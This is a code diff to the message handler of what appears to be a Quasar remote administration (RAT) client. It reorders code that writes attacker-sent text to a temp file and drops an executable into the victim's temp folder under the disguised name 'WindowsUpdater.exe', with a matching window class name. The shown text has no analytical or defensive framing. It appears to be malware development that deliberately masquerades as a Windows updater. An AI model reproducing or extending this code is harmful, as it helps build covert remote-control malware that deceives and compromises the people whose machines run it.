@@ -35,13 +35,13 @@ namespace Quasar.Client.Messages
                 string actionStr = message.Action;
                 bool flag7 = false;
                 string contentStr = ""; //display text
+                contentStr = message.Text;
+                string text9 = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".txt");
                 if (actionStr == "close")
                 {
                     contentStr = "";
                     flag7 = true;
                 }
-                contentStr = message.Text;
-                string text9 = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".txt");
                 try
                 {
                     using (StreamWriter writer = new StreamWriter(text9, false, System.Text.Encoding.Unicode))
@@ -57,12 +57,7 @@ namespace Quasar.Client.Messages
                 string str = "WindowsUpdater"; // window class name
                 if (message.WindowClassName != null)
                 {
-                   // str = message.WindowClassName;
-                }
-                int num = 36;
-                if (message.FontSize != 0)  // font size
-                {
-                    num = message.FontSize;
+                    // str = message.WindowClassName;
                 }
                 string text10 = Path.Combine(Path.GetTempPath(), str + ".exe");
                 try
@@ -72,6 +67,12 @@ namespace Quasar.Client.Messages
                 }
                 catch (Exception)
                 {
+                    // client.Send(new NotifyMessageToServer { Message = "RedText app writing error!" });
+                }
+                int num = 36;
+                if (message.FontSize != 0)  // font size
+                {
+                    num = message.FontSize;
                 }
                 try
                 {
